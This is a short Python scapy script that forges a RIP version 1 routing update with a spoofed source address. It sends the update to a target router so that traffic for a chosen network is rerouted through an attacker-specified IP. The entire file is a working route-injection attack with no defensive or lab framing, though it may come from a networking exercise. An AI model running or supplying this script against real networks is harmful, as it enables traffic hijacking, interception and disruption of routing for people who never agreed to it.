import sys
import socket
import struct
from scapy.all import *

if __name__ == "__main__":
	# Store arguments in variables.
	target_ip = str(sys.argv[1])
	network_addr = str(sys.argv[2])
	reroute_ip = str(sys.argv[3])

	# Separate Network IP adress from CIDR (Classless Inter-Domain Routing)
	network_ip =network_addr.split("/")
	host_bits = 32 - int(network_ip[1])
	subnet_mask = socket.inet_ntoa(struct.pack('!I', (1 << 32) - (1 << host_bits)))
	
	# Create packet for rerouting ip and send it.
	ip = IP(src=reroute_ip, dst=target_ip)
	rip = RIP(cmd=2, version=1)/ RIPEntry(addr=network_ip[0], mask=subnet_mask)
	pkt = ip/ UDP(dport=520)/ rip
	send(pkt)

